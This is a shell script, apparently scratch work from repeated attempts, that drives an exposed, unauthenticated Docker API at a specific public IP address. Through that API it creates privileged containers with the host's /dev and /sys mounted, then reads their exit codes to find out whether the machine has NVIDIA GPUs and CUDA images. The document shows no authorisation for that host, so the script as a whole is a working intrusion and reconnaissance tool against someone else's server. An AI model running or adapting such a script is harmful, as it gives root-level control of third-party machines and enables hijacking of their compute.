#!/bin/sh
# throwaway 4: pin the measurement channel with controls, then read the GPU bit.
#
# Why: three probe containers reported exit 0 but FinishedAt=null, i.e. still
# running, which makes the 0 meaningless. Never trust a probe whose channel is
# unverified - so run a KNOWN answer first and confirm the channel carries it.
#
#   ctl7   exit 7                     -> channel works if we read ExitCode 7
#   ctlN   exit $(ls /host/dev|wc -l) -> binds work if it is a 3-digit number
#   gpuD   exit $(ls /host/dev/nvidia*|wc -l)  -> 0 means no nvidia device node
#   gpuR   exit $(ls /sys/class/drm|wc -l)     -> 0 means no DRM card
# No double quotes anywhere in Cmd, so the JSON stays valid (learned on attempt 3,
# where a quoted var broke create and surfaced as a confusing 404 on start).
H=134.209.121.89
N=probe$$
mk() {
    n=$1; d=$2; binds=$3
    curl -sS -m 8 -X DELETE "http://$H:2375/containers/$n?force=1" >/dev/null 2>&1
    if [ -n "$binds" ]; then hc=',"HostConfig":{"Privileged":true,"Binds":["/dev:/host/dev","/sys:/host/sys"]}'; else hc=''; fi
    body="{\"Image\":\"busybox:1.36\",\"Cmd\":[\"sh\",\"-c\",\"$d\"]$hc}"
    c=$(curl -sS -m 25 -X POST "http://$H:2375/containers/create?name=$n" -H 'Content-Type: application/json' -d "$body" 2>/dev/null | grep -oE '[0-9a-f]{64}' | head -1)
    s=$(curl -sS -m 15 -o /dev/null -w '%{http_code}' -X POST "http://$H:2375/containers/$n/start" 2>/dev/null)
    echo "$n create=${c:+ok} start=$s"
}
mk ctl7_$N "exit 7" ""
mk ctlN_$N "exit \$(ls /host/dev | wc -l)" yes
mk gpuD_$N "exit \$(ls /host/dev/nvidia* 2>/dev/null | wc -l)" yes
mk gpuR_$N "exit \$(ls /sys/class/drm 2>/dev/null | wc -l)" yes
sleep 12
echo "== results (ctl7 must be 7 or the channel is untrusted)"
for n in ctl7_$N ctlN_$N gpuD_$N gpuR_$N; do
    st=$(curl -sS -m 8 "http://$H:2375/containers/$n/json" 2>/dev/null)
    ec=$(printf %s "$st" | grep -o '"ExitCode":[0-9-]*' | head -1)
    fz=$(printf %s "$st" | grep -o '"FinishedAt":"[0-9]*' | head -1)
    echo "$n $ec finished=$fz"
done
echo "== /info nvidia markers"; grep -o -i nvidia /tmp/_i2.json 2>/dev/null | wc -l
echo "== cuda image present?"; curl -sS -m 8 "http://$H:2375/images/json" 2>/dev/null | grep -o 'nvidia/cuda[^"]*' | head -3
date -u
